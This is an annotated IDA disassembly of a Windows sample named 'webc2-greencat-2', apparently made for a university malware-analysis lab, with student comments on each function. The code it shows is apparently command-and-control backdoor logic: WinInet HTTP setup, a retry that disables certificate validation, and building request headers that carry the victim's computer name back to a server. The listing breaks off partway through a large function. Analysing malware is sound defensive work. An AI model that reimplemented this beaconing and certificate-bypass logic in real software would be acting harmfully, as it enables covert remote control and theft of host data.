.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2021 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |                      License info: 48-BABB-7E64-E2                      |
.text:00401000 ; |                     Georgia Institute of Technology                     |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : C23039CF2F859E659E59EC362277321FBCDAC680E6D9BC93FC03C8971333C25E
.text:00401000 ; Input MD5    : 57E79F7DF13C0CB01910D0C688FCD296
.text:00401000 ; Input CRC32  : 2ED342ED
.text:00401000
.text:00401000 ; File Name   : /nethome/nnarvekar6/Desktop/lab2/webc2-greencat-2
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 4EC4B644 (Thu Nov 17 07:22:44 2011)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00001C6E (   7278.)
.text:00401000 ; Section size in file          : 00001E00 (   7680.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000 ; OS type         :  MS Windows
.text:00401000 ; Application type:  Executable 32bit
.text:00401000
.text:00401000 .686p
.text:00401000 .mmx
.text:00401000 .model flat
.text:00401000
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text segment para public 'CODE' use32
.text:00401000 assume cs:_text
.text:00401000 ;org 401000h
.text:00401000 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000
.text:00401000
.text:00401000 ; int __thiscall DeletingPtr(void *, char)
.text:00401000 DeletingPtr proc near
.text:00401000
.text:00401000 arg_0= byte ptr  4
.text:00401000
.text:00401000 push    esi
.text:00401001 mov     esi, ecx
.text:00401003 call    NearEnd
.text:00401008 test    [esp+4+arg_0], 1
.text:0040100D jz      short loc_401016
.text:0040100F push    esi             ; void *
.text:00401010 call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401015 pop     ecx             ; deleting ptr to variable, freeing up space
.text:00401016
.text:00401016 loc_401016:
.text:00401016 mov     eax, esi
.text:00401018 pop     esi
.text:00401019 retn    4
.text:00401019 DeletingPtr endp
.text:00401019
.text:0040101C
.text:0040101C
.text:0040101C ; Attributes: bp-based frame
.text:0040101C
.text:0040101C ; int __stdcall AllocatingAndDeletingPtrs(char *Str, char *, char *, char *, int, int)
.text:0040101C AllocatingAndDeletingPtrs proc near
.text:0040101C
.text:0040101C Str= dword ptr  8
.text:0040101C arg_4= dword ptr  0Ch
.text:0040101C arg_8= dword ptr  10h
.text:0040101C arg_C= dword ptr  14h
.text:0040101C arg_10= dword ptr  18h
.text:0040101C arg_14= dword ptr  1Ch
.text:0040101C
.text:0040101C push    ebp
.text:0040101D mov     ebp, esp        ; setting up stack
.text:0040101F push    esi
.text:00401020 mov     esi, ecx
.text:00401022 push    [ebp+Str]       ; Str
.text:00401025 xor     eax, eax
.text:00401027 mov     [esi+4], eax
.text:0040102A mov     [esi+8], eax
.text:0040102D mov     [esi+0Ch], eax
.text:00401030 mov     [esi+14h], eax
.text:00401033 mov     [esi+18h], eax
.text:00401036 mov     [esi+1Ch], eax
.text:00401039 mov     [esi+20h], eax  ; zeroing out array values
.text:0040103C mov     eax, [ebp+arg_10] ; eax = arg_10
.text:0040103F mov     [esi+24h], eax  ; [var_5c + 24h] = arg_10
.text:00401042 mov     eax, [ebp+arg_14] ; eax = arg_14
.text:00401045 mov     dword ptr [esi], offset off_403150
.text:0040104B mov     [esi+10h], eax  ; [esi + 10h] = arg_14
.text:0040104E call    DeleteAndAllocatePtr_1
.text:00401053 push    [ebp+arg_8]     ; Str
.text:00401056 mov     ecx, esi
.text:00401058 call    DeleteAndAllocatePtr_withBackslash
.text:0040105D push    [ebp+arg_4]     ; Str
.text:00401060 mov     ecx, esi
.text:00401062 call    DeleteAndAllocatePtr_2
.text:00401067 push    [ebp+arg_C]     ; Str
.text:0040106A mov     ecx, esi
.text:0040106C call    DeleteAndAllocatePtr_3
.text:00401071 mov     eax, esi
.text:00401073 pop     esi
.text:00401074 pop     ebp
.text:00401075 retn    18h
.text:00401075 AllocatingAndDeletingPtrs endp
.text:00401075
.text:00401078
.text:00401078
.text:00401078
.text:00401078 NearEnd proc near
.text:00401078 push    esi
.text:00401079 mov     esi, ecx
.text:0040107B mov     dword ptr [esi], offset off_403150
.text:00401081 call    CloseHttp
.text:00401086 mov     eax, [esi+18h]
.text:00401089 test    eax, eax        ; checking if eax is zero
.text:0040108B jz      short loc_401094
.text:0040108D push    eax             ; void *
.text:0040108E call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401093 pop     ecx             ; if it isn't then we free the memory
.text:00401094
.text:00401094 loc_401094:
.text:00401094 mov     eax, [esi+1Ch]
.text:00401097 test    eax, eax        ; checking if the http session status is zero
.text:00401099 jz      short loc_4010A2
.text:0040109B push    eax             ; void *
.text:0040109C call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:004010A1 pop     ecx             ; if it isn't then we free the memory
.text:004010A2
.text:004010A2 loc_4010A2:
.text:004010A2 mov     eax, [esi+14h]
.text:004010A5 test    eax, eax        ; checking the winInet status if it is zero
.text:004010A7 jz      short loc_4010B0
.text:004010A9 push    eax             ; void *
.text:004010AA call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:004010AF pop     ecx             ; if it isn't then we free the memory
.text:004010B0
.text:004010B0 loc_4010B0:
.text:004010B0 mov     esi, [esi+20h]
.text:004010B3 test    esi, esi        ; checking if esi is zero
.text:004010B5 jz      short loc_4010BE
.text:004010B7 push    esi             ; void *
.text:004010B8 call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:004010BD pop     ecx             ; if it isn't then we free the memory
.text:004010BE
.text:004010BE loc_4010BE:             ; clean up stack
.text:004010BE pop     esi
.text:004010BF retn
.text:004010BF NearEnd endp
.text:004010BF
.text:004010C0
.text:004010C0
.text:004010C0
.text:004010C0 SetUpHttp proc near
.text:004010C0
.text:004010C0 var_4= dword ptr -4
.text:004010C0
.text:004010C0 push    ecx
.text:004010C1 push    ebx
.text:004010C2 push    ebp
.text:004010C3 push    esi
.text:004010C4 xor     ebp, ebp
.text:004010C6 push    edi
.text:004010C7 push    ebp             ; dwFlags
.text:004010C8 push    ebp             ; lpszProxyBypass
.text:004010C9 mov     esi, ecx
.text:004010CB push    ebp             ; lpszProxy
.text:004010CC push    ebp             ; dwAccessType
.text:004010CD push    dword ptr [esi+1Ch] ; lpszAgent
.text:004010D0 call    ds:InternetOpenA
.text:004010D6 cmp     eax, ebp        ; eax = handle for subsequent inet functions or null
.text:004010D8 mov     [esi+4], eax
.text:004010DB jz      loc_401162      ; if handle is null jump and return
.text:004010E1 cmp     [esi+10h], ebp  ; if lpBuffer is null, jump, part of internet configuration
.text:004010E4 lea     ebx, [esi+10h]
.text:004010E7 jz      short loc_40110F ; check if [esi+24h] is null
.text:004010E9 mov     edi, ds:InternetSetOptionA
.text:004010EF push    4               ; dwBufferLength
.text:004010F1 push    ebx             ; lpBuffer
.text:004010F2 push    5               ; dwOption
.text:004010F4 push    eax             ; hInternet
.text:004010F5 call    edi ; InternetSetOptionA
.text:004010F7 push    4               ; dwBufferLength
.text:004010F9 push    ebx             ; lpBuffer
.text:004010FA push    2               ; dwOption
.text:004010FC push    dword ptr [esi+4] ; hInternet
.text:004010FF call    edi ; InternetSetOptionA
.text:00401101 push    4               ; dwBufferLength
.text:00401103 push    ebx             ; lpBuffer
.text:00401104 push    6               ; dwOption
.text:00401106 push    dword ptr [esi+4] ; hInternet
.text:00401109 call    edi ; InternetSetOptionA
.text:0040110B mov     [esp+14h+var_4], eax ; eax = true if successful, false otherwise
.text:0040110F
.text:0040110F loc_40110F:             ; check if [esi+24h] is null
.text:0040110F cmp     [esi+24h], ebp
.text:00401112 jz      short loc_401120
.text:00401114 mov     ebx, 84803100h
.text:00401119 mov     eax, 1BBh
.text:0040111E jmp     short loc_401128
.text:00401120
.text:00401120 loc_401120:
.text:00401120 push    50h ; 'P'
.text:00401122 mov     ebx, 84000100h
.text:00401127 pop     eax
.text:00401128
.text:00401128 loc_401128:             ; dwContext
.text:00401128 push    ebp
.text:00401129 push    ebp             ; dwFlags
.text:0040112A mov     edi, offset szReferrer
.text:0040112F push    3               ; dwService
.text:00401131 push    edi             ; lpszPassword
.text:00401132 push    edi             ; lpszUserName
.text:00401133 push    eax             ; nServerPort
.text:00401134 push    dword ptr [esi+18h] ; lpszServerName
.text:00401137 push    dword ptr [esi+4] ; hInternet
.text:0040113A call    ds:InternetConnectA
.text:00401140 cmp     eax, ebp        ; if internetConnectA successful, eax = valid handle for the session, else null
.text:00401142 mov     [esi+8], eax    ; storing session status in [esi+8]
.text:00401145 jz      short loc_401162 ; if handle is null jump, else doon't juuump
.text:00401147 push    ebp             ; dwContext
.text:00401148 push    ebx             ; dwFlags
.text:00401149 push    ebp             ; lplpszAcceptTypes
.text:0040114A push    edi             ; lpszReferrer
.text:0040114B push    ebp             ; lpszVersion
.text:0040114C push    dword ptr [esi+14h] ; lpszObjectName
.text:0040114F push    offset szVerb   ; "GET"
.text:00401154 push    eax             ; hConnect
.text:00401155 call    ds:HttpOpenRequestA
.text:0040115B cmp     eax, ebp        ; if http get request successful, returns request handle, else eax = null
.text:0040115D mov     [esi+0Ch], eax  ; storing handle in [esi + OCh]
.text:00401160 jnz     short loc_401166 ; if handle isn't null jump
.text:00401162
.text:00401162 loc_401162:
.text:00401162 xor     eax, eax
.text:00401164 jmp     short loc_401193
.text:00401166
.text:00401166 loc_401166:             ; storing lpszHeaders in eax
.text:00401166 mov     eax, [esi+20h]
.text:00401169 cmp     eax, ebp        ; check if headers are null
.text:0040116B jz      short loc_40118F
.text:0040116D push    eax             ; Str
.text:0040116E call    strlen
.text:00401173 test    eax, eax        ; check if length of lpszHeaders is 0
.text:00401175 pop     ecx
.text:00401176 jz      short loc_40118F
.text:00401178 push    20000000h       ; dwModifiers
.text:0040117D push    0FFFFFFFFh      ; dwHeadersLength
.text:0040117F push    dword ptr [esi+20h] ; lpszHeaders
.text:00401182 push    dword ptr [esi+0Ch] ; hRequest
.text:00401185 call    ds:HttpAddRequestHeadersA
.text:0040118B mov     [esp+14h+var_4], eax ; storing true if successfful, false if not.
.text:0040118F
.text:0040118F loc_40118F:
.text:0040118F mov     eax, [esp+14h+var_4]
.text:00401193
.text:00401193 loc_401193:
.text:00401193 pop     edi
.text:00401194 pop     esi
.text:00401195 pop     ebp
.text:00401196 pop     ebx
.text:00401197 pop     ecx
.text:00401198 retn
.text:00401198 SetUpHttp endp
.text:00401198
.text:00401199
.text:00401199
.text:00401199
.text:00401199 ; int __stdcall DeleteAndAllocatePtr_1(char *Str)
.text:00401199 DeleteAndAllocatePtr_1 proc near
.text:00401199
.text:00401199 Str= dword ptr  4
.text:00401199
.text:00401199 push    ebx
.text:0040119A mov     ebx, [esp+4+Str]
.text:0040119E push    esi
.text:0040119F mov     esi, ecx
.text:004011A1 test    ebx, ebx
.text:004011A3 jnz     short loc_4011A9 ; if ebx is not empty
.text:004011A5 xor     eax, eax
.text:004011A7 jmp     short loc_4011D9
.text:004011A9
.text:004011A9 loc_4011A9:
.text:004011A9 push    edi
.text:004011AA push    ebx             ; Str
.text:004011AB call    strlen          ; calling strlen on string in ebx
.text:004011B0 mov     edi, eax        ; storing length in edi
.text:004011B2 mov     eax, [esi+18h]  ; if esi is unchanged, esi +18h = 0
.text:004011B5 test    eax, eax
.text:004011B7 pop     ecx
.text:004011B8 jz      short loc_4011C1
.text:004011BA push    eax             ; void *
.text:004011BB call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:004011C0 pop     ecx
.text:004011C1
.text:004011C1 loc_4011C1:
.text:004011C1 inc     edi
.text:004011C2 push    edi             ; unsigned int
.text:004011C3 call    ??2@YAPAXI@Z    ; operator new(uint)
.text:004011C8 push    ebx             ; Source
.text:004011C9 push    eax             ; Destination
.text:004011CA mov     [esi+18h], eax
.text:004011CD call    strcpy          ; copying string in ebx  to eax
.text:004011D2 add     esp, 0Ch
.text:004011D5 push    1
.text:004011D7 pop     eax
.text:004011D8 pop     edi
.text:004011D9
.text:004011D9 loc_4011D9:
.text:004011D9 pop     esi
.text:004011DA pop     ebx
.text:004011DB retn    4
.text:004011DB DeleteAndAllocatePtr_1 endp
.text:004011DB
.text:004011DE
.text:004011DE
.text:004011DE
.text:004011DE ; int __stdcall DeleteAndAllocatePtr_withBackslash(char *Str)
.text:004011DE DeleteAndAllocatePtr_withBackslash proc near
.text:004011DE
.text:004011DE Str= dword ptr  4
.text:004011DE
.text:004011DE push    ebx
.text:004011DF mov     ebx, [esp+4+Str] ; storing string in ebx
.text:004011E3 push    esi
.text:004011E4 mov     esi, ecx
.text:004011E6 test    ebx, ebx        ; checking if string is empty
.text:004011E8 jnz     short loc_4011EE
.text:004011EA xor     eax, eax
.text:004011EC jmp     short loc_401236
.text:004011EE
.text:004011EE loc_4011EE:
.text:004011EE push    edi
.text:004011EF push    ebx             ; Str
.text:004011F0 call    strlen
.text:004011F5 mov     edi, eax        ; ;eax = strlen, moving it into edi
.text:004011F7 mov     eax, [esi+14h]
.text:004011FA test    eax, eax        ; checking if [esi+14h] is empty
.text:004011FC pop     ecx
.text:004011FD jz      short loc_401206
.text:004011FF push    eax             ; void *
.text:00401200 call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401205 pop     ecx
.text:00401206
.text:00401206 loc_401206:
.text:00401206 lea     eax, [edi+2]
.text:00401209 push    eax             ; unsigned int
.text:0040120A call    ??2@YAPAXI@Z    ; operator new(uint)
.text:0040120F push    ebx             ; Source
.text:00401210 push    eax             ; Destination
.text:00401211 mov     [esi+14h], eax  ; storing alloced unsigned into into [esi + 14h]
.text:00401214 call    strcpy
.text:00401219 mov     eax, [esi+14h]  ; reverting eax back to what it was before strcpy
.text:0040121C add     esp, 0Ch
.text:0040121F add     eax, edi
.text:00401221 cmp     byte ptr [eax-1], 2Fh ; '/' ; if end of string = '/' jump
.text:00401225 jz      short loc_401232
.text:00401227 mov     byte ptr [eax], 2Fh ; '/' ; '/', adding backslash to end of string
.text:0040122A mov     eax, [esi+14h]
.text:0040122D and     byte ptr [eax+edi+1], 0 ; appending 0 to string, so now it ends in "/0"
.text:00401232
.text:00401232 loc_401232:
.text:00401232 push    1
.text:00401234 pop     eax
.text:00401235 pop     edi
.text:00401236
.text:00401236 loc_401236:
.text:00401236 pop     esi
.text:00401237 pop     ebx
.text:00401238 retn    4
.text:00401238 DeleteAndAllocatePtr_withBackslash endp
.text:00401238
.text:0040123B
.text:0040123B
.text:0040123B
.text:0040123B ; int __stdcall DeleteAndAllocatePtr_2(char *Str)
.text:0040123B DeleteAndAllocatePtr_2 proc near
.text:0040123B
.text:0040123B Str= dword ptr  4
.text:0040123B
.text:0040123B push    ebx
.text:0040123C mov     ebx, [esp+4+Str] ; string stored to stack in calling subroutine is being put into ebx
.text:00401240 push    esi
.text:00401241 mov     esi, ecx
.text:00401243 test    ebx, ebx        ; checking if ebx is empty
.text:00401245 jnz     short loc_40124B
.text:00401247 xor     eax, eax        ; if string empty clear out eax and return
.text:00401249 jmp     short loc_40127B
.text:0040124B
.text:0040124B loc_40124B:
.text:0040124B push    edi
.text:0040124C push    ebx             ; Str
.text:0040124D call    strlen
.text:00401252 mov     edi, eax        ; storing string length in edi
.text:00401254 mov     eax, [esi+1Ch]  ; loading in value in eax that was stored in subroutine A
.text:00401257 test    eax, eax        ; testing if eax is empty
.text:00401259 pop     ecx
.text:0040125A jz      short loc_401263
.text:0040125C push    eax             ; void *
.text:0040125D call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401262 pop     ecx             ; delete if eax is empty
.text:00401263
.text:00401263 loc_401263:
.text:00401263 inc     edi
.text:00401264 push    edi             ; unsigned int
.text:00401265 call    ??2@YAPAXI@Z    ; operator new(uint)
.text:0040126A push    ebx             ; Source
.text:0040126B push    eax             ; Destination
.text:0040126C mov     [esi+1Ch], eax  ; storing ebx in [esi + 1C] so that eax can be overwritten
.text:0040126F call    strcpy
.text:00401274 add     esp, 0Ch        ; clearing 3 items off the stack
.text:00401277 push    1
.text:00401279 pop     eax
.text:0040127A pop     edi
.text:0040127B
.text:0040127B loc_40127B:
.text:0040127B pop     esi
.text:0040127C pop     ebx
.text:0040127D retn    4
.text:0040127D DeleteAndAllocatePtr_2 endp
.text:0040127D
.text:00401280
.text:00401280
.text:00401280
.text:00401280 ; int __stdcall DeleteAndAllocatePtr_3(char *Str)
.text:00401280 DeleteAndAllocatePtr_3 proc near
.text:00401280
.text:00401280 Str= dword ptr  4
.text:00401280
.text:00401280 push    ebx
.text:00401281 mov     ebx, [esp+4+Str] ; ebx = Str
.text:00401285 push    esi
.text:00401286 mov     esi, ecx
.text:00401288 test    ebx, ebx        ; checking if ebx is empty
.text:0040128A jnz     short loc_401290 ; jump if str isn't empty
.text:0040128C xor     eax, eax
.text:0040128E jmp     short loc_4012C0
.text:00401290
.text:00401290 loc_401290:
.text:00401290 push    edi
.text:00401291 push    ebx             ; Str
.text:00401292 call    strlen          ; get length of string
.text:00401297 mov     edi, eax        ; put length in edi
.text:00401299 mov     eax, [esi+20h]
.text:0040129C test    eax, eax        ; check if [esi + 20h] is empty
.text:0040129E pop     ecx
.text:0040129F jz      short loc_4012A8 ; jump if it is empty
.text:004012A1 push    eax             ; void *
.text:004012A2 call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:004012A7 pop     ecx             ; delete ptr to [esi + 20h] if it isn't empty
.text:004012A8
.text:004012A8 loc_4012A8:
.text:004012A8 inc     edi
.text:004012A9 push    edi             ; unsigned int
.text:004012AA call    ??2@YAPAXI@Z    ; allocate new space for the string
.text:004012AF push    ebx             ; Source
.text:004012B0 push    eax             ; Destination
.text:004012B1 mov     [esi+20h], eax
.text:004012B4 call    strcpy          ; copy ebx to eax ptr
.text:004012B9 add     esp, 0Ch
.text:004012BC push    1
.text:004012BE pop     eax
.text:004012BF pop     edi
.text:004012C0
.text:004012C0 loc_4012C0:
.text:004012C0 pop     esi
.text:004012C1 pop     ebx
.text:004012C2 retn    4
.text:004012C2 DeleteAndAllocatePtr_3 endp
.text:004012C2
.text:004012C5
.text:004012C5
.text:004012C5 ; Attributes: bp-based frame
.text:004012C5
.text:004012C5 ; int __stdcall HTTPwithCertificateCheck(LPVOID lpOptional, DWORD dwOptionalLength)
.text:004012C5 HTTPwithCertificateCheck proc near
.text:004012C5
.text:004012C5 Buffer= byte ptr -4Ch
.text:004012C5 dwBufferLength= dword ptr -0Ch
.text:004012C5 var_8= dword ptr -8
.text:004012C5 var_4= byte ptr -4
.text:004012C5 var_3= byte ptr -3
.text:004012C5 lpOptional= dword ptr  8
.text:004012C5 dwOptionalLength= dword ptr  0Ch
.text:004012C5
.text:004012C5 push    ebp
.text:004012C6 mov     ebp, esp
.text:004012C8 sub     esp, 4Ch
.text:004012CB push    esi
.text:004012CC mov     esi, ecx
.text:004012CE cmp     dword ptr [esi+0Ch], 0 ; if [esi + 0Ch] = 0 exit
.text:004012D2 jnz     short loc_4012DB
.text:004012D4 xor     eax, eax        ; clear out eax, indicates failure
.text:004012D6 jmp     loc_40138A
.text:004012DB
.text:004012DB loc_4012DB:
.text:004012DB push    ebx
.text:004012DC push    edi
.text:004012DD push    [ebp+dwOptionalLength]
.text:004012E0 mov     edi, ds:sprintf
.text:004012E6 lea     eax, [ebp+Buffer]
.text:004012E9 push    offset Format   ; "Content-Length: %d\r\n"
.text:004012EE push    eax             ; Buffer
.text:004012EF call    edi ; sprintf
.text:004012F1 mov     ebx, ds:HttpAddRequestHeadersA
.text:004012F7 add     esp, 0Ch        ; this block is formatting a string for use with HTTP and pushing parameters on the stack for HttpAddRequestHeadersA
.text:004012FA lea     eax, [ebp+Buffer]
.text:004012FD push    0A0000000h      ; dwModifiers
.text:00401302 push    0FFFFFFFFh      ; dwHeadersLength
.text:00401304 push    eax             ; lpszHeaders
.text:00401305 push    dword ptr [esi+0Ch] ; hRequest
.text:00401308
.text:00401308 loc_401308:
.text:00401308 call    ebx ; HttpAddRequestHeadersA
.text:0040130A push    [ebp+dwOptionalLength] ; dwOptionalLength
.text:0040130D push    [ebp+lpOptional] ; lpOptional
.text:00401310 push    0               ; dwHeadersLength
.text:00401312 push    0               ; lpszHeaders
.text:00401314 push    dword ptr [esi+0Ch] ; hRequest
.text:00401317 call    ds:HttpSendRequestA ; sends specified request to HTTP server with added headers from previous function
.text:0040131D test    eax, eax        ; check if request was successful
.text:0040131F mov     [ebp+var_8], eax ; store success result in [ebp + var_8]
.text:00401322 jnz     short loc_401385 ; eax = HTTP success result
.text:00401324 call    ds:GetLastError ; eax = the thread's last error code
.text:0040132A cmp     eax, 2F0Dh      ; check if error is due to invalid certificate.
.text:0040132F jnz     short loc_401385 ; eax = HTTP success result
.text:00401331 lea     eax, [ebp+dwBufferLength]
.text:00401334 mov     [ebp+dwBufferLength], 4
.text:0040133B push    eax             ; lpdwBufferLength
.text:0040133C lea     eax, [ebp+var_4] ; [ebp + var_4] = lpBuffer
.text:0040133F push    eax             ; lpBuffer
.text:00401340 push    1Fh             ; dwOption, unsigned long int that contains the security flags for a handle
.text:00401342 push    dword ptr [esi+0Ch] ; hInternet
.text:00401345 call    ds:InternetQueryOptionA
.text:0040134B or      [ebp+var_3], 1
.text:0040134F lea     eax, [ebp+var_4]
.text:00401352 push    4               ; dwBufferLength
.text:00401354 push    eax             ; lpBuffer
.text:00401355 push    1Fh             ; dwOption
.text:00401357 push    dword ptr [esi+0Ch] ; hInternet
.text:0040135A call    ds:InternetSetOptionA ; set option queried in previous function
.text:00401360 test    eax, eax        ; test if setting option was successful
.text:00401362 jz      short loc_401385 ; jump if setting option not successful
.text:00401364 push    [ebp+dwOptionalLength]
.text:00401367 lea     eax, [ebp+Buffer]
.text:0040136A push    offset Format   ; "Content-Length: %d\r\n"
.text:0040136F push    eax             ; Buffer
.text:00401370 call    edi ; sprintf   ; print buffer formatted by "format"
.text:00401372 add     esp, 0Ch
.text:00401375 lea     eax, [ebp+Buffer]
.text:00401378 push    0A0000000h
.text:0040137D push    0FFFFFFFFh      ; pushing parameters for RequestHTTPHeadersA
.text:0040137F push    eax             ; this is all set up to try the HTTP request again
.text:00401380 push    dword ptr [esi+0Ch]
.text:00401383 jmp     short loc_401308
.text:00401385
.text:00401385 loc_401385:             ; eax = HTTP success result
.text:00401385 mov     eax, [ebp+var_8]
.text:00401388 pop     edi
.text:00401389 pop     ebx
.text:0040138A
.text:0040138A loc_40138A:
.text:0040138A pop     esi
.text:0040138B leave
.text:0040138C retn    8
.text:0040138C HTTPwithCertificateCheck endp
.text:0040138C
.text:0040138F
.text:0040138F
.text:0040138F
.text:0040138F ; int __stdcall InternetReadFileSub(LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
.text:0040138F InternetReadFileSub proc near
.text:0040138F
.text:0040138F lpBuffer= dword ptr  4
.text:0040138F dwNumberOfBytesToRead= dword ptr  8
.text:0040138F lpdwNumberOfBytesRead= dword ptr  0Ch
.text:0040138F
.text:0040138F push    [esp+lpdwNumberOfBytesRead] ; lpdwNumberOfBytesRead
.text:00401393 push    [esp+4+dwNumberOfBytesToRead] ; dwNumberOfBytesToRead
.text:00401397 push    [esp+8+lpBuffer] ; lpBuffer
.text:0040139B push    dword ptr [ecx+0Ch] ; hFile
.text:0040139E call    ds:InternetReadFile ; reads data from handle and puts in lpBuffer
.text:004013A4 retn    0Ch
.text:004013A4 InternetReadFileSub endp
.text:004013A4
.text:004013A7
.text:004013A7
.text:004013A7
.text:004013A7 ; int __stdcall SettingUpHttpToSendBackInfo(char *Str)
.text:004013A7 SettingUpHttpToSendBackInfo proc near
.text:004013A7
.text:004013A7 Str= dword ptr  4
.text:004013A7
.text:004013A7 push    esi
.text:004013A8 mov     esi, [esp+4+Str]
.text:004013AC push    edi
.text:004013AD mov     edi, ecx
.text:004013AF test    esi, esi        ; check if Str is empty
.text:004013B1 jnz     short loc_4013B7 ; jump if it is not empty
.text:004013B3 xor     eax, eax        ; clear eax if it is empty
.text:004013B5 jmp     short loc_4013C7
.text:004013B7
.text:004013B7 loc_4013B7:             ; Str
.text:004013B7 push    esi
.text:004013B8 call    strlen          ; get length of string
.text:004013BD pop     ecx
.text:004013BE push    eax             ; dwOptionalLength
.text:004013BF push    esi             ; lpOptional
.text:004013C0 mov     ecx, edi
.text:004013C2 call    HTTPwithCertificateCheck
.text:004013C7
.text:004013C7 loc_4013C7:
.text:004013C7 pop     edi
.text:004013C8 pop     esi
.text:004013C9 retn    4
.text:004013C9 SettingUpHttpToSendBackInfo endp
.text:004013C9
.text:004013CC
.text:004013CC
.text:004013CC
.text:004013CC CloseHttp proc near
.text:004013CC push    esi
.text:004013CD mov     esi, ecx
.text:004013CF push    edi
.text:004013D0 mov     edi, ds:InternetCloseHandle
.text:004013D6 mov     eax, [esi+0Ch]  ; storing handle in eax
.text:004013D9 test    eax, eax        ; testing if handle is null
.text:004013DB jz      short loc_4013E4 ; if handle is null jump
.text:004013DD push    eax             ; hInternet
.text:004013DE call    edi ; InternetCloseHandle
.text:004013E0 and     dword ptr [esi+0Ch], 0 ; close handle, and overwrite hande at [esi + OCh] with 0
.text:004013E4
.text:004013E4 loc_4013E4:             ; moving http session status to eax
.text:004013E4 mov     eax, [esi+8]
.text:004013E7 test    eax, eax        ; testing if session status is null
.text:004013E9 jz      short loc_4013F2 ; is status is null jump
.text:004013EB push    eax             ; hInternet
.text:004013EC call    edi ; InternetCloseHandle
.text:004013EE and     dword ptr [esi+8], 0 ; close session and write 0 to [esi+8] to indicate session is closed
.text:004013F2
.text:004013F2 loc_4013F2:             ; eax = handle for winInet functions
.text:004013F2 mov     eax, [esi+4]
.text:004013F5 test    eax, eax        ; testing if handle is null
.text:004013F7 jz      short loc_401400 ; jump if handle is null
.text:004013F9 push    eax             ; hInternet
.text:004013FA call    edi ; InternetCloseHandle
.text:004013FC and     dword ptr [esi+4], 0 ; close handle, write 0 to [esi + 4] to indicate null value
.text:00401400
.text:00401400 loc_401400:
.text:00401400 push    1
.text:00401402 pop     eax
.text:00401403 pop     edi
.text:00401404 pop     esi
.text:00401405 retn
.text:00401405 CloseHttp endp
.text:00401405
.text:00401406
.text:00401406
.text:00401406 ; Attributes: bp-based frame
.text:00401406
.text:00401406 ; int __cdecl ThickBoi(char *, char *Str, char *Destination, char *String2)
.text:00401406 ThickBoi proc near
.text:00401406
.text:00401406 var_290= dword ptr -290h
.text:00401406 NameBuffer= byte ptr -280h
.text:00401406 Buffer= byte ptr -17Ch
.text:00401406 var_74= _SECURITY_ATTRIBUTES ptr -74h
.text:00401406 PipeAttributes= _SECURITY_ATTRIBUTES ptr -68h
.text:00401406 var_5C= dword ptr -5Ch
.text:00401406 var_34= dword ptr -34h
.text:00401406 var_30= dword ptr -30h
.text:00401406 hReadPipe= dword ptr -2Ch
.text:00401406 var_28= dword ptr -28h
.text:00401406 hWritePipe= dword ptr -24h
.text:00401406 hObject= dword ptr -20h
.text:00401406 var_1C= dword ptr -1Ch
.text:00401406 hFile= dword ptr -18h
.text:00401406 nSize= dword ptr -14h
.text:00401406 dwNumberOfBytesRead= dword ptr -10h
.text:00401406 var_C= dword ptr -0Ch
.text:00401406 var_4= dword ptr -4
.text:00401406 arg_0= dword ptr  8
.text:00401406 Str= dword ptr  0Ch
.text:00401406 Destination= dword ptr  10h
.text:00401406 String2= dword ptr  14h
.text:00401406
.text:00401406 ; FUNCTION CHUNK AT .text:00402C48 SIZE 00000012 BYTES
.text:00401406
.text:00401406 ; __unwind { // loc_402C50
.text:00401406 mov     eax, offset loc_402C50
.text:0040140B call    __EH_prolog
.text:00401410 sub     esp, 274h
.text:00401416 push    ebx
.text:00401417 push    esi
.text:00401418 push    edi
.text:00401419 xor     ebx, ebx        ; zeroing ebx
.text:0040141B xor     edi, edi        ; zeroing edi
.text:0040141D cmp     [ebp+arg_0], ebx ; checking if arg_0 = 0
.text:00401420 mov     [ebp+var_30], ebx
.text:00401423 mov     [ebp+var_28], ebx
.text:00401426 mov     dword_4047A0, ebx ; zeroing var_30, var_28, dword_4047A0
.text:0040142C jz      loc_401962
.text:00401432 cmp     [ebp+Str], ebx  ; if arg0 isnt 0 check if Str is 0
.text:00401435 jz      loc_401962
.text:0040143B push    400h            ; unsigned int
.text:00401440 call    ??2@YAPAXI@Z    ; operator new(uint)
.text:00401445 mov     esi, eax
.text:00401447 pop     ecx             ; cleaning up stack
.text:00401448 cmp     esi, ebx        ; comparing return of function to 0
.text:0040144A mov     [ebp+var_34], esi
.text:0040144D jz      loc_401962
.text:00401453 push    offset Source   ; "Accept:*/*\r\nPragma:no-cache\r\nCache-"...
.text:00401458 push    esi             ; Destination
.text:00401459 call    strcpy
.text:0040145E push    offset aComputer ; "Computer:"
.text:00401463 push    esi             ; Destination
.text:00401464 call    strcat
.text:00401469 push    esi             ; Str
.text:0040146A call    strlen          ; concatenate "Source" and "aComputer" and find the length
.text:0040146F add     esp, 14h
.text:00401472 lea     ecx, [ebp+nSize]
.text:00401475 add     eax, esi
.text:00401477 mov     [ebp+nSize], 10h
.text:0040147E push    ecx             ; nSize
.text:0040147F push    eax             ; lpBuffer
.text:00401480 mov     [ebp+var_1C], eax
.text:00401483 call    ds:GetComputerNameA ; storing computer name into string buffer, essentially concatenating
.text:00401489 push    36EE80h         ; int
.text:0040148E lea     ecx, [ebp+var_5C]
